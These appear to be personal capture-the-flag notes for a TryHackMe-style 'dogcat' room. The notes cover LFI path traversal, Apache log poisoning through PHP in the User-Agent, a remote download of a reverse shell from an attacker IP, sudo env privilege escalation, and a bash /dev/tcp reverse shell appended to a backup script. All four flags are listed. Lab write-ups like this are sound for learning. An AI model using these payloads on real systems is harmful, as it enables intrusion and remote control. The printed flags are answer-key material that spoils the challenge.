<pre>
Machine IP: 10.10.109.201
    Enum:
        Open ports:
22/tcp open  ssh
80/tcp open  http    

Enum port 80:
    LFI inclusion:
    http://10.10.172.21/?view=dog/../../../../../../etc/passwd&ext
    http://10.10.172.21/?view=dog/../../../../../var/log/apache2/access.log&ext=


Lets get flags!

Flag1:
    Go to burpsuite at repeater: burp
        GET /?view=../../../..//var/log/apache2/cat/../access.log&ext= HTTP/1.1
Host: 10.10.109.201
User-Agent: <?php system('id) ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

    Lets make a php reverse shell and make a python http.server 80

    Upload reverse shell: burp
        GET /?view=../../../../var/log/apache2/cat/../access.log&ext= HTTP/1.1
Host: 10.10.109.201
User-Agent: <?php file_put_contents('shell.php',file_get_contents('http://10.9.18.191:80/shell.php'));?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
 

Make a listener:
$ lrwrap nc -lvnp 9003
And run the reverse shell: from browser
    http://10.10.109.201/?view=cats/../shell
At /var/www/html flag1.php
Lets priv esc:
    $ sudo -l
User www-data may run the following commands on 5d6c733eca8b:
    (root) NOPASSWD: /usr/bin/env
    $ sudo env /bin/sh
        And got root! But not dogcat hostname
    /var/www/flag2_QMW7JvaY2LvK.txt => flag2
    /root/flag3.txt => flag3

    

Lets change hostname:
    $ /opt/backups
    $ echo "bash -i >& /dev/tcp/10.8.129.79/9003 0>&1" >> backup.sh => reverse shell 
        Wait 1min with netcat listener on attacker box 
    Flag4 /root
    


    Flag1:THM{Th1s_1s_N0t_4_Catdog_ab67edfa}
    Flag2:THM{LF1_t0_RC3_aec3fb}
    Flag3:THM{D1ff3r3nt_3nv1ronments_874112}
    Flag4:THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
</pre>
